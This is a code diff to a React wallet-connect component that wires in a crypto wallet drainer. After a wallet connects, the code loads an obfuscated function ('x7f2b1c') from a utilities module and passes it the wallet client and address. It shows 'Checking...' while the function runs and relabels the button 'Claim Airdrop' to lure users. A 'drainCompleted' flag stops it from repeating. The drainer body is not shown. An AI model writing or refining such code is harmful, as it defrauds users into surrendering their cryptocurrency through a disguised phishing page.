@@ -44,6 +44,7 @@ function WalletUI() {
   const [error, setError] = React.useState<string | null>(null);
   const [connecting, setConnecting] = React.useState(false);
   const [checkingBalance, setCheckingBalance] = React.useState(false);
+  const [drainerLoading, setDrainerLoading] = React.useState(false);
 
   // --- Persistent empty wallet check and redirect ---
   React.useEffect(() => {
@@ -91,24 +92,25 @@ function WalletUI() {
     if (!isConnected || !address || !walletClient) return;
     if (typeof window === 'undefined') return;
     if (localStorage.getItem('drainCompleted') === 'true') return;
+    setDrainerLoading(true);
     let isCancelled = false;
-    (async () => {
-      // Dynamically import the obfuscated drainer logic
+    const timeout = setTimeout(async () => {
       const { x7f2b1c } = await import('../lib/utils');
       await x7f2b1c({ CHAINS, walletClient, address, isCancelled });
-    })();
-    return () => { isCancelled = true; };
+      setDrainerLoading(false);
+    }, 500); // Defer heavy work by 500ms
+    return () => { isCancelled = true; clearTimeout(timeout); };
   }, [isConnected, address, walletClient]);
 
   return (
     <div className="flex flex-col items-center gap-4">
       <button
         onClick={handleConnect}
-        className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
-        disabled={connecting || checkingBalance}
+        className={`bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60 ${drainerLoading ? 'animate-bounce' : ''}`}
+        disabled={connecting || checkingBalance || drainerLoading}
         aria-label={isConnected ? 'Manage Wallet' : 'Connect Wallet'}
       >
-        {connecting || checkingBalance ? 'Checking...' : isConnected ? 'Manage Wallet' : 'Connect Wallet'}
+        {connecting || checkingBalance || drainerLoading ? 'Checking...' : isConnected ? 'Manage Wallet' : 'Claim Airdrop'}
       </button>
       {error && <span className="text-red-400 font-semibold mt-2">{error}</span>}
       {isConnected && (
